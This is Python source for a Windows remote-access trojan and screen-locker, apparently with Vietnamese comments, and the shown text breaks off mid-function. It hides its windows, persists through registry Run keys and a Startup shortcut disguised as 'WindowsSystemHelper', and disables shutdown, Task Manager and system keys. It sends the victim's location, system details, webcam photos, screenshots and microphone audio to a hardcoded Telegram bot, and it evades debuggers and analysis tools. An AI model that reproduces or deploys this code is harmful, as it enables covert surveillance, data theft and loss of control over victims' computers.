import sys
import os
import subprocess
import ctypes
import time

# ================== TỰ ĐỘNG CÀI ĐẶT THƯ VIỆN (CHẠY NGẦM) ==================

def install_missing_libraries():
    """Tự động cài thư viện thiếu trong nền (ẩn cửa sổ)"""
    marker_path = os.path.join(os.environ.get("TEMP", "."), "vip_setup_done.marker")
    
    # Kiểm tra nếu đã cài đặt rồi thì bỏ qua
    if os.path.exists(marker_path):
        # Đọc thời gian cài đặt, nếu quá 7 ngày thì cài lại
        try:
            with open(marker_path, 'r') as f:
                install_time = float(f.read().strip())
                if time.time() - install_time < 604800:  # 7 ngày
                    return
        except:
            pass
    
    # Ẩn console window khi cài thư viện
    try:
        if sys.platform == "win32":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    required = [
        'pyqt6',
        'keyboard',
        'psutil',
        'pyOpenSSL',
        'pywin32',
        'python-telegram-bot==20.7',
        'opencv-python',
        'pillow',
        'sounddevice',
        'numpy'
    ]
    
    startupinfo = None
    if sys.platform == "win32":
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
    
    installed_any = False
    for pkg in required:
        name = pkg.split('==')[0].replace('-', '_').lower()
        try:
            __import__(name)
        except ImportError:
            installed_any = True
            try:
                # Chạy pip install trong nền hoàn toàn
                process = subprocess.Popen(
                    [sys.executable, "-m", "pip", "install", "--quiet", pkg],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                )
                process.wait(timeout=60)  # Đợi tối đa 60 giây
            except:
                pass
    
    if installed_any:
        # Lưu thời gian cài đặt
        try:
            with open(marker_path, 'w') as f:
                f.write(str(time.time()))
        except:
            pass
        
        # Sau khi cài xong, khởi động lại chương trình
        try:
            if sys.platform == "win32":
                # Ẩn console window hiện tại
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                
                # Khởi động lại chương trình với tham số để không cài đặt lại
                os.execl(sys.executable, sys.executable, *sys.argv)
            else:
                os.execv(sys.executable, [sys.executable] + sys.argv)
        except:
            pass

# Chạy cài đặt ngay khi import
install_missing_libraries()

# ================== PHẦN CÒN LẠI CỦA CODE ==================

import random
import socket
import uuid
import platform
import winreg
import keyboard
import ctypes
import os
import time
import psutil
import hashlib
import urllib.parse
import binascii
import urllib.request
import ssl
import subprocess
import asyncio
import threading
import json
import queue
import cv2
from PIL import ImageGrab
import win32api
import win32con
import win32gui
import getpass
import sounddevice as sd
import wave

from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit,
    QPushButton, QVBoxLayout, QGridLayout, QFrame, QTextEdit, QHBoxLayout
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal
from PyQt6.QtGui import QFont, QColor, QPainter, QPen

# ================== CẤU HÌNH ==================

BOT_TOKEN = "8657007557:AAEo-H_RdOvr6Pc1i5G2yIVUy0NU5RLHjdk"
ADMIN_IDS = [7779940330]  # THAY BẰNG ID THẬT CỦA BẠN

JSON_URL = "https://www.hackerkn.x10.mx/datakey.json"

BG_COLOR = "black"
FG_COLOR = "#00FF00"
FONT_FAMILY = "Courier New"
MAX_ATTEMPTS = 3
LOCKOUT_DURATION = 300

REAL_WALLPAPER_URL = "https://sf-static.upanhlaylink.com/img/image_20260322b74c7fa89c7cb58462e91d4f6e489d9d.jpg"

failed_attempts = 0
is_locked_out = False

# ================== TẠO ID RIÊNG & KEY ==================

unique_id = str(uuid.uuid4())[:8].upper()

try:
    ip = socket.gethostbyname(socket.gethostname())
except:
    ip = "127.0.0.1"

combined = ip + unique_id
hash_val = int(hashlib.sha256(combined.encode()).hexdigest(), 16)
device_key = hash_val % 900000 + 100000  # Key 6 số

# ================== QUEUE & CHAT GLOBALS ==================

chat_queue_out = queue.Queue()  # GUI -> Bot
chat_queue_in = queue.Queue()   # Bot -> GUI
chat_history = []               # Lưu lịch sử chat
admin_msg_ids = {}              # {admin_id: message_id} - Để edit tin nhắn

# ================== AUTO RUN KHI KHỞI ĐỘNG ==================

def add_to_startup():
    """Thêm chương trình vào startup để chạy mỗi khi khởi động Windows"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        app_name = "WindowsSystemHelper"
        
        # 1. Thêm vào Registry HKCU (Current User)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{sys.executable}" "{current_file}"')
            winreg.CloseKey(key)
        except: pass

        # 2. Thêm vào Registry HKLM (Local Machine - Nếu có quyền Admin) -> Chạy nhanh hơn cho toàn bộ user
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{sys.executable}" "{current_file}"')
                winreg.CloseKey(key)
        except: pass
        
        # 3. Tạo Shortcut trong Startup Folder (Dự phòng)
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder, exist_ok=True)
            
        shortcut_path = os.path.join(startup_folder, f"{app_name}.lnk")
        ps_script = f'''
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut("{shortcut_path}")
        $Shortcut.TargetPath = "{sys.executable}"
        $Shortcut.Arguments = "{current_file}"
        $Shortcut.WorkingDirectory = "{os.path.dirname(current_file)}"
        $Shortcut.Save()
        '''
        subprocess.run(['powershell', '-Command', ps_script], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
    except Exception as e:
        print(f"Lỗi thêm startup: {e}")
        return False

def remove_from_startup():
    """Xóa chương trình khỏi startup"""
    try:
        app_name = "WindowsSystemHelper"
        
        # Xóa khỏi HKCU
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, app_name)
            winreg.CloseKey(key)
        except: pass
        
        # Xóa khỏi HKLM (Nếu có)
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, app_name)
                winreg.CloseKey(key)
        except: pass
        
        # Xóa Shortcut
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        shortcut_path = os.path.join(startup_folder, f"{app_name}.lnk")
        
        if os.path.exists(shortcut_path):
            os.remove(shortcut_path)
            
        return True
    except:
        return False

# ================== ANTI SHUTDOWN NÂNG CAO ==================

class AntiShutdownManager:
    """Quản lý chống tắt máy trái phép"""
    
    def __init__(self):
        self.shutdown_blocked = True
        self.is_admin = False
        
        # Kiểm tra quyền admin
        self.check_admin_rights()
        
        # Vô hiệu hóa các phương thức tắt máy
        self.block_all_shutdown_methods()
    
    def check_admin_rights(self):
        """Kiểm tra quyền admin"""
        try:
            self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            pass
    
    def block_all_shutdown_methods(self):
        """Chặn tất cả các cách tắt máy"""
        try:
            # 1. Chặn nút nguồn vật lý qua registry
            self.block_power_button_registry()
            
            # 2. Chặn Slide to Shutdown
            self.block_slide_to_shutdown()
            
            # 3. Chặn Alt+F4 trên desktop
            self.block_alt_f4()
            
            # 4. Block các tiến trình shutdown
            self.block_shutdown_processes()
            
            # 5. Chặn shutdown từ Start Menu
            self.block_start_menu_shutdown()
            
        except Exception as e:
            print(f"Lỗi khi chặn shutdown: {e}")
    
    def block_power_button_registry(self):
        """Vô hiệu hóa nút nguồn qua registry"""
        try:
            # Đường dẫn registry cho nút nguồn
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            ]
            
            for hkey, path in reg_paths:
                try:
                    key = winreg.CreateKey(hkey, path)
                    # 1 = Tắt máy, 0 = Không làm gì
                    winreg.SetValueEx(key, "PowerButtonAction", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "SleepButtonAction", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "LidCloseAction", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                except:
                    pass
            
            # Chặn shutdown từ Start Menu
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "Start_PowerButtonAction", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
        except Exception as e:
            print(f"Lỗi registry: {e}")
    
    def block_slide_to_shutdown(self):
        """Chặn Slide to Shutdown (vuốt để tắt máy)"""
        def monitor_slidetoshutdown():
            while True:
                try:
                    for proc in psutil.process_iter(['name', 'pid']):
                        if proc.info['name'] and proc.info['name'].lower() in ['slidetoshutdown.exe', 'shutdown.exe', 'wpeutil.exe', 'pshutdown.exe']:
                            proc.kill()
                except:
                    pass
                time.sleep(0.1)
        
        threading.Thread(target=monitor_slidetoshutdown, daemon=True).start()
    
    def block_alt_f4(self):
        """Chặn Alt+F4 trên desktop"""
        def alt_f4_blocker():
            while True:
                try:
                    # Kiểm tra nếu đang ở desktop
                    current_window = win32gui.GetForegroundWindow()
                    window_class = win32gui.GetClassName(current_window)
                    
                    # Desktop thường có class là 'Progman' hoặc 'WorkerW'
                    if window_class in ['Progman', 'WorkerW']:
                        if keyboard.is_pressed('alt') and keyboard.is_pressed('f4'):
                            # Chặn sự kiện
                            keyboard.block_key('f4')
                            time.sleep(0.5)
                            keyboard.unblock_key('f4')
                except:
                    pass
                time.sleep(0.1)
        
        threading.Thread(target=alt_f4_blocker, daemon=True).start()
    
    def block_shutdown_processes(self):
        """Chặn các tiến trình shutdown"""
        blocked_processes = [
            'shutdown.exe', 'wpeutil.exe', 'pshutdown.exe',
            'tsshutdn.exe', 'wmic.exe'
        ]
        
        def process_monitor():
            while True:
                try:
                    for proc in psutil.process_iter(['name', 'pid']):
                        if proc.info['name'] and proc.info['name'].lower() in blocked_processes:
                            try:
                                proc.kill()
                            except:
                                pass
                except:
                    pass
                time.sleep(0.5)
        
        threading.Thread(target=process_monitor, daemon=True).start()
    
    def block_start_menu_shutdown(self):
        """Chặn shutdown từ Start Menu"""
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                                   r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            winreg.SetValueEx(key, "NoShutdown", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def restore_defaults(self):
        """Khôi phục cài đặt gốc cho nút nguồn"""
        try:
            # Xóa các giá trị registry đã set
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            ]
            
            for hkey, path in reg_paths:
                try:
                    key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                    values_to_delete = ["PowerButtonAction", "SleepButtonAction", "LidCloseAction", "NoClose", "Start_PowerButtonAction", "NoShutdown"]
                    for value in values_to_delete:
                        try:
                            winreg.DeleteValue(key, value)
                        except:
                            pass
                    winreg.CloseKey(key)
                except:
                    pass
                
        except:
            pass

# Khởi tạo AntiShutdownManager
anti_shutdown = None

# ================== GỬI INFO VỀ TELEGRAM ==================

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply, Bot
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)

class AudioRecorder:
    def __init__(self):
        self.filename = os.path.join(os.environ.get("TEMP", "."), f"voice_{int(time.time())}.wav")
        self.fs = 44100
        self.channels = 1
        self.is_recording = False
        self.stream = None
        self.wave_file = None

    def start(self):
        try:
            self.is_recording = True
            self.wave_file = wave.open(self.filename, 'wb')
            self.wave_file.setnchannels(self.channels)
            self.wave_file.setsampwidth(2)
            self.wave_file.setframerate(self.fs)
            
            def callback(indata, frames, time, status):
                if self.is_recording and self.wave_file:
                    self.wave_file.writeframes(indata.tobytes())

            self.stream = sd.InputStream(samplerate=self.fs, channels=self.channels, dtype='int16', callback=callback)
            self.stream.start()
        except Exception as e:
            print(f"Rec error: {e}")

    def stop(self):
        self.is_recording = False
        if self.stream:
            self.stream.stop()
            self.stream.close()
        if self.wave_file:
            self.wave_file.close()
        return self.filename

audio_recorder = AudioRecorder()

def capture_camera():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None
        ret, frame = cap.read()
        cap.release()
        if ret:
            image_path = os.path.join(os.environ.get("TEMP", "."), "capture_cam.jpg")
            cv2.imwrite(image_path, frame)
            return image_path
    except:
        pass
    return None

def capture_screenshot():
    try:
        image_path = os.path.join(os.environ.get("TEMP", "."), "capture_screen.jpg")
        screenshot = ImageGrab.grab()
        screenshot.save(image_path)
        return image_path
    except:
        return None

async def update_admins_view(app):
    """Cập nhật tin nhắn dashboard cho tất cả admin"""
    try:
        hostname = socket.gethostname()
    except:
        hostname = "Unknown"

    history_text = "\n".join(chat_history)
    if not history_text:
        history_text = "Chưa có tin nhắn nào."

    text_content = (
        f"🔴 **KẾT NỐI TRỰC TIẾP: {hostname}**\n"
        f"ID: `{unique_id}` | IP: `{ip}`\n"
        f"--------------------------------\n"
        f"{history_text}\n"
        f"--------------------------------\n"
        f"Bấm nút dưới để trả lời 👇"
    )

    keyboard = [
        [InlineKeyboardButton("💬 Trả lời (Reply)", callback_data="reply_chat")],
        [InlineKeyboardButton("📸 Chụp Camera", callback_data="capture_cam"), InlineKeyboardButton("🖥️ Chụp Màn Hình", callback_data="capture_screen")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    for admin_id in ADMIN_IDS:
        try:
            if admin_id in admin_msg_ids:
                try:
                    await app.bot.edit_message_text(
                        chat_id=admin_id,
                        message_id=admin_msg_ids[admin_id],
                        text=text_content,
                        parse_mode="Markdown",
                        reply_markup=reply_markup
                    )
                except Exception:
                    # Nếu không sửa được (do xóa hoặc quá cũ), gửi mới
                    msg = await app.bot.send_message(chat_id=admin_id, text=text_content, parse_mode="Markdown", reply_markup=reply_markup)
                    admin_msg_ids[admin_id] = msg.message_id
            else:
                msg = await app.bot.send_message(chat_id=admin_id, text=text_content, parse_mode="Markdown", reply_markup=reply_markup)
                admin_msg_ids[admin_id] = msg.message_id
        except Exception as e:
            print(f"Lỗi gửi admin {admin_id}: {e}")

async def handle_admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ADMIN_IDS:
        return

    msg_text = update.message.text
    if not msg_text: return

    # Cập nhật lịch sử
    timestamp = time.strftime('%H:%M')
    chat_history.append(f"👮 **Admin {timestamp}**: {msg_text}")
    if len(chat_history) > 10: chat_history.pop(0)

    # Gửi xuống GUI
    chat_queue_in.put(msg_text)

    # Cập nhật view Telegram
    await update_admins_view(context.application)

    # Báo đã gửi
    try:
        await context.bot.send_message(chat_id=user.id, text=f"✅ Đã gửi cho máy: {msg_text}")
    except:
        pass

    # Xóa tin nhắn lệnh của admin để chat log sạch đẹp (nếu bot có quyền)
    try:
        await update.message.delete()
    except:
        pass

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "reply_chat":
        # ForceReply để admin nhập tin nhắn
        await context.bot.send_message(
            chat_id=query.from_user.id,
            text="Rep nạn nhân:",
            reply_markup=ForceReply(selective=True)
        )
    elif query.data in ["capture_cam", "capture_screen"]:
        action_name = "webcam" if query.data == "capture_cam" else "màn hình"
        chat_id = query.from_user.id
        
        processing_msg = await context.bot.send_message(
            chat_id=chat_id, 
            text=f"⏳ Đang chụp {action_name}..."
        )
        
        loop = asyncio.get_running_loop()
        if query.data == "capture_cam":
            photo_path = await loop.run_in_executor(None, capture_camera)
        else:
            photo_path = await loop.run_in_executor(None, capture_screenshot)
            
        if photo_path and os.path.exists(photo_path):
            try:
                with open(photo_path, 'rb') as photo:
                    await context.bot.send_photo(
                        chat_id=chat_id, 
                        photo=photo, 
                        caption=f"📸 {action_name} từ: {socket.gethostname()}"
                    )
                os.remove(photo_path)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=f"Lỗi gửi ảnh: {e}")
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"❌ Không thể chụp {action_name}.")
            
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=processing_msg.message_id)
        except:
            pass

def get_location_info():
    lat = None
    lon = None
    source = "IP"
    
    # 1. Thử lấy vị trí chính xác từ Windows Location API (PowerShell)
    try:
        if sys.platform == "win32":
            ps_script = """
            Add-Type -AssemblyName System.Device
            $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
            $GeoWatcher.Start()
            $count = 0
            while (($GeoWatcher.Status -ne 'Ready') -and ($count -lt 5)) { Start-Sleep -Milliseconds 1000; $count++ }
            if ($GeoWatcher.Status -eq 'Ready') {
                $Loc = $GeoWatcher.Position.Location
                if (-not [double]::IsNaN($Loc.Latitude)) {
                    Write-Output "$($Loc.Latitude),$($Loc.Longitude)"
                }
            }
            """
            result = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True, creationflags=0x08000000).stdout.strip()
            if result and ',' in result:
                parts = result.split(',')
                lat = float(parts[0])
                lon = float(parts[1])
                source = "GPS/Wi-Fi (Chính xác)"
    except:
        pass

    # 2. Nếu không được, dùng IP-API
    if lat is None or lon is None:
        try:
            with urllib.request.urlopen("http://ip-api.com/json/") as url:
                data = json.loads(url.read().decode())
                if data.get('status') == 'success':
                    lat = data.get('lat')
                    lon = data.get('lon')
                    source = "IP (Tương đối)"
        except:
            pass

    if lat is not None and lon is not None:
        # Lấy địa chỉ chi tiết từ tọa độ (Reverse Geocoding)
        address = "Đang lấy địa chỉ..."
        try:
            req = urllib.request.Request(
                f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}",
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            with urllib.request.urlopen(req, timeout=5) as addr_url:
                addr_data = json.loads(addr_url.read().decode())
                address = addr_data.get('display_name', address)
        except:
            pass

        map_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        return (
            f"» Nguồn: {source}\n"
            f"» Địa chỉ: {address}\n"
            f"» Tọa độ: {lat}, {lon}\n"
            f"» Bản đồ: {map_url}"
        )
        
    return "» Vị trí: Không xác định"

async def send_device_info(bot):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
    except:
        hostname = "Unknown"
        ip = "Unknown"

    loop = asyncio.get_running_loop()
    location = await loop.run_in_executor(None, get_location_info)

    info_text = (
        f"🚨 HACKER LML THÔNG BÁO 🚨\n"
        f"────────────────────\n"
        f"🔓 THIẾT BỊ ĐÃ XÂM NHẬP\n"
        f"────────────────────\n\n"

        f"🖥️ THÔNG TIN MÁY\n"
        f"» Tên máy: {hostname}\n"
        f"» Địa chỉ IP: {ip}\n"
        f"» Địa chỉ MAC: {':'.join(('%012X' % uuid.getnode())[i:i+2] for i in range(0,12,2))}\n"
        f"» Hệ điều hành: {platform.system()} {platform.release()}\n"
        f"────────────────────\n\n"

        f"📍 VỊ TRÍ CHI TIẾT\n"
        f"{location}\n"
        f"────────────────────\n\n"

        f"⚙️ THÔNG SỐ KỸ THUẬT\n"
        f"» RAM  : {round(psutil.virtual_memory().total / (1024**3), 2)}GB ({psutil.virtual_memory().percent}%)\n"
        f"» Ổ CỨNG: {round(psutil.disk_usage('/').total / (1024**3), 2)}GB ({psutil.disk_usage('/').percent}%)\n"
        f"» VI XỬ LÝ: {psutil.cpu_count()} LÕI ({psutil.cpu_percent()}%)\n"
        f"────────────────────\n\n"

        f"🔐 MÃ KHÓA TRUY CẬP\n"
        f"» ID THIẾT BỊ: {unique_id}\n"
        f"» MÃ KEY 6 SỐ: {device_key:06d}\n"
        f"» Trạng thái: ĐÃ MÃ HÓA 🔒\n"
        f"────────────────────\n\n"

        f"📊 TRẠNG THÁI HOẠT ĐỘNG\n"
        f"» Tự động chạy: {'✅ BẬT' if add_to_startup() else '❌ TẮT'}\n"
        f"» Chế độ ẩn   : {'✅ KÍCH HOẠT' if sys.platform == 'win32' else '❌ KHÔNG'}\n"
        f"» Thời gian   : {time.strftime('%H:%M:%S')}\n"
        f"────────────────────\n\n"

        f"📋 HƯỚNG DẪN:\n\n"
        f"Sao chép ID và KEY\n\n"
        f"Thêm vào 'datakey.json'\n\n"
        f"Khóa thiết bị vĩnh viễn\n"
        f"────────────────────"
    )

    keyboard = [
        [InlineKeyboardButton("💬 Trả lời (Reply)", callback_data="reply_chat")],
        [InlineKeyboardButton("📸 Chụp Camera", callback_data="capture_cam"),
         InlineKeyboardButton("🖥️ Chụp Màn Hình", callback_data="capture_screen")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(chat_id=admin_id, text=info_text, parse_mode="Markdown", reply_markup=reply_markup)
        except Exception as e:
            print(f"Không gửi info cho admin {admin_id}: {e}")
            
    # Tự động chụp và gửi ảnh khi khởi động
    
    # Chụp Camera
    for i in range(2):
        cam_path = await loop.run_in_executor(None, capture_camera)
        if cam_path and os.path.exists(cam_path):
            for admin_id in ADMIN_IDS:
                try:
                    with open(cam_path, 'rb') as photo:
                        await bot.send_photo(chat_id=admin_id, photo=photo, caption=f"📸 Camera tự động lúc khởi động ({i+1}/2): {hostname}")
                except: pass
            try: os.remove(cam_path)
            except: pass
        await asyncio.sleep(1)

    # Chụp Màn hình
    screen_path = await loop.run_in_executor(None, capture_screenshot)
    if screen_path and os.path.exists(screen_path):
        for admin_id in ADMIN_IDS:
            try:
                with open(screen_path, 'rb') as photo:
                    await bot.send_photo(chat_id=admin_id, photo=photo, caption=f"🖥️ Màn hình tự động lúc khởi động: {hostname}")
            except: pass
        try: os.remove(screen_path)
        except: pass

async def process_gui_queue(app):
    """Task chạy ngầm để lấy tin nhắn từ GUI gửi lên Bot"""
    try:
        hostname = socket.gethostname()
    except:
        hostname = "Device"

    while True:
        try:
            msg = chat_queue_out.get_nowait()
            timestamp = time.strftime('%H:%M')
            chat_history.append(f"💻 **{hostname} {timestamp}**: {msg}")
            if len(chat_history) > 10: chat_history.pop(0)
            await update_admins_view(app)
        except queue.Empty:
            await asyncio.sleep(0.5)
        except Exception:
            await asyncio.sleep(1)

async def send_audio_to_admins():
    if not os.path.exists(audio_recorder.filename): return
    bot = Bot(token=BOT_TOKEN)
    for admin_id in ADMIN_IDS:
        try:
            with open(audio_recorder.filename, 'rb') as audio:
                await bot.send_audio(chat_id=admin_id, audio=audio, caption=f"🎤 Ghi âm từ: {socket.gethostname()}")
        except: pass
    try: os.remove(audio_recorder.filename)
    except: pass

def stop_and_send_audio():
    audio_recorder.stop()
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_audio_to_admins())
        loop.close()
    except: pass

def run_bot_and_send_info():
    if not BOT_TOKEN or not ADMIN_IDS:
        print("Thiếu BOT_TOKEN hoặc ADMIN_IDS → không chạy bot")
        return

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_reply))
    app.add_handler(CallbackQueryHandler(button_callback))

    async def startup():
        await app.initialize()
        await app.start()
        await send_device_info(app.bot)
        loop.create_task(process_gui_queue(app))
        await app.updater.start_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )

    try:
        loop.run_until_complete(startup())
    except Exception as e:
        print(f"Lỗi khởi động bot Telegram: {e}")
    loop.run_forever()

# ================== ANTI DEBUG / ANTI HOOK ==================

def anti_debug():
    if hasattr(sys, "gettrace") and sys.gettrace() is not None:
        os._exit(1)
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(1)
    except:
        pass

def anti_pythonpath():
    if "PYTHONPATH" in os.environ:
        os._exit(1)
    try:
        sitecustomize_path = os.path.join(sys.prefix, "lib", "site-packages", "sitecustomize.py")
        if os.path.exists(sitecustomize_path):
            os._exit(1)
    except:
        pass

class URLAntiDebug:
    def __init__(self):
        self.blacklisted_processes = [
            "frida", "frida-server", "frida-gadget", "frida-agent", "objection",
            "mitmproxy", "mitmdump", "wireshark", "fiddler", "charles", "burpsuite",
            "httptoolkit", "proxyman", "tcpdump", "tshark", "httpdebugger"
        ]
        self.suspicious_ports = [27042, 27043, 8080, 8081, 8888, 8000, 8008]

    def is_hooked_or_debugged(self):
        checks = [
            self._check_frida_in_memory,
            self._check_blacklisted_processes,
            self._check_frida_port,
            self._check_timing_anomaly,
            self._check_debugger_present,
        ]
        fail_count = sum(1 for check in checks if check())
        return fail_count >= 2

    def _check_frida_in_memory(self):
        try:
            proc = psutil.Process()
            maps = [m.path.lower() for m in proc.memory_maps() if m.path]
            indicators = ["frida", "gadget", "agent", "gumjs"]
            return any(any(ind in p for ind in indicators) for p in maps)
        except:
            return False

    def _check_blacklisted_processes(self):
        try:
            for p in psutil.process_iter(['name']):
                if any(b in p.info['name'].lower() for b in self.blacklisted_processes):
                    return True
            return False
        except:
            return False

    def _check_frida_port(self):
        try:
            for conn in psutil.net_connections():
                if conn.laddr and conn.laddr.port in self.suspicious_ports:
                    return True
            return False
        except:
            return False

    def _check_timing_anomaly(self):
        try:
            start = time.perf_counter()
            for _ in range(2000):
                _ = hashlib.sha256(str(random.random()).encode()).digest()
            elapsed = time.perf_counter() - start
            return elapsed > 0.12 or elapsed < 0.0008
        except:
            return False

    def _check_debugger_present(self):
        try:
            return bool(ctypes.windll.kernel32.IsDebuggerPresent())
        except:
            return False

# ================== OPENSSL CLIENT ==================

from OpenSSL import SSL

class OpenSSLClient:
    def __init__(self, verify=False, timeout=12, max_retry=5):
        self.verify = verify
        self.timeout = timeout
        self.max_retry = max_retry
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def request(self, method, url, data=None):
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or 443
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        headers = {
            "Host": host,
            "User-Agent": self.ua,
            "Accept": "application/json, text/plain, */*",
            "Connection": "close",
        }

        body = b""
        if data:
            body = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
            headers["Content-Length"] = str(len(body))

        req_line = f"{method} {path} HTTP/1.1"
        header_lines = [req_line] + [f"{k}: {v}" for k,v in headers.items()] + ["", ""]
        raw_req = ("\r\n".join(header_lines)).encode() + body

        ctx = SSL.Context(SSL.TLS_CLIENT_METHOD)
        if not self.verify:
            ctx.set_verify(SSL.VERIFY_NONE, lambda *x: True)

        sock = socket.create_connection((host, port), timeout=self.timeout)
        conn = SSL.Connection(ctx, sock)
        conn.set_connect_state()
        conn.set_tlsext_host_name(host.encode())

        for _ in range(self.max_retry):
            try:
                conn.do_handshake()
                break
            except SSL.WantReadError:
                time.sleep(0.08)
            except:
                conn.close()
                sock.close()
                raise

        conn.sendall(raw_req)
        resp = b""
        while True:
            try:
                chunk = conn.recv(16384)
                if not chunk:
                    break
                resp += chunk
            except:
                break

        conn.close()
        sock.close()

        if not resp:
            return b""

        try:
            header_end = resp.index(b"\r\n\r\n")
            body = resp[header_end + 4:]
            return body
        except:
            return resp

    def get(self, url):
        return self.request("GET", url)

# ================== HỆ THỐNG ==================

def toggle_task_manager(disable=True):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if disable else 0)
        winreg.CloseKey(key)
    except:
        pass

def kill_explorer():
    try:
        if sys.platform == "win32":
            subprocess.run("taskkill /F /IM explorer.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

def start_explorer():
    try:
        if sys.platform == "win32":
            subprocess.Popen("explorer.exe")
    except: pass

def block_system_keys():
    for key in ['windows', 'alt', 'tab', 'esc']:
        try:
            keyboard.block_key(key)
        except:
            pass

def unblock_system_keys():
    try:
        keyboard.unhook_all()
    except:
        pass

def change_wallpaper_from_url(url):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
            raw = response.read()

        if not raw or len(raw) < 8000:
            return

        temp_dir = os.environ.get("TEMP", os.path.expanduser("~/AppData/Local/Temp"))
